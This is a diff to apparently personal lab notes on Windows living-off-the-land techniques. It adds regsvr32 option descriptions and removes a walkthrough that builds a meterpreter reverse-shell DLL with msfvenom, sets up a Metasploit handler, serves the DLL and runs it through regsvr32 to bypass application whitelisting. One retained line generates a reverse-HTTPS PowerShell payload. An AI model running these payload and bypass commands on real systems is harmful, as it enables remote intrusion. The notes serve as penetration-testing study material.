@@ -15,6 +15,12 @@ FindStr Options:
   > c:\Windows\Temp\test.exe
               Redirect the output to a file on the target machine
 
+Regsvr32 Options:
+ 	/s   Silent mode (without showing messages)
+ 	/n   Not call the DLL register server
+ 	/i:: Use another server since we used /n
+ 	/u   Run with unregister method
+
 
 Informational:
   Certutil is a Windows built-in utility for handling certification services. It is used to dump and display Certification Authority (CA) configuration information and other CA components.
@@ -28,33 +34,6 @@ Informational:
   Application Whitelisting is a Microsoft endpoint security feature that prevents malicious and unauthorized programs from executing in real-time.
 
 
-
-  msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll
-                                Create a malicious DLL file using `msfvenom` and set up our Metasploit listener to receive a reverse shell
-                                Note that we will be creating a malicious file that works for 32bit operating systems. We will be using the `regsvr32.exe`
-                                Application Whitelisting Bypass technique to run a command on a target system.
-                                We specified the output type as `DLL` using the `-f` argument
-msfconsole -q
-  use exploit/multi/handler
-  set payload windows/meterpreter/reverse_tcp
-  set LHOST ATTACKBOX_IP
-  set LPORT 443
-  exploit
-python3 -m http.server 1337     Once the malicious `DLL` file is generated, we need to deliver the payload to the victim machine. 
-                                We will do this by using a webserver to serve the `DLL` file on our attacking machine
-                                From the victim machine, visit the webserver of the attacking machine on port `1337` that we specify.
-c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll
-or
-c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
-                                Once the file `DLL` file is downloaded, we execute it using `regsvr32.exe`. We should receive a reverse shell.
-                                Note if we wanted to create a 64-bit `DLL` version, we need to specify it in the `msfvenom` command and
-                                run it from the victim machine using the `64bits` version of `regsvr32.exe` at `C:\Windows\SysWOW64\regsvr32.exe`.
-
-Regsvr32 Options (second option):
- 	/s   Silent mode (without showing messages)
- 	/n   Not call the DLL register server
- 	/i:: Use another server since we used /n
- 	/u   Run with unregister method
 
 Other techniques:
 msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
